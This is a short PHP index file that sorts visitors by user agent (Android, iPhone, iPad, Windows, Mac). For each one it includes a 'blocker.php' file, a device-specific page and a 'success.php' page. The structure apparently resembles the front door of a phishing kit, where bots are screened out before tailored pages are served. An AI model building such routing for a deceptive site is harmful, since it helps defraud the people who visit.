<?php
$agent = $_SERVER['HTTP_USER_AGENT'];
//android web
if(stripos($agent, "android")){ 
include 'blocker.php';     
include 'pages/android.php';
include 'pages/success.php';
}
//iphone/ipad web
elseif (stripos($agent, "iPhone")){
include 'blocker.php';         
include "pages/iphone.php";
include 'pages/success.php';
}elseif (stripos($agent, "iPad")){    
include 'blocker.php';     
include "pages/iphone.php";
include 'pages/success.php';
}
//pc
elseif (stripos($agent, "Windows")){  
include 'blocker.php';       
include 'pages/pc.php';
include 'pages/success.php';
}
elseif (stripos($agent, "Macintosh")){  
include 'blocker.php';       
include 'pages/pc.php';
include 'pages/success.php';
}
?>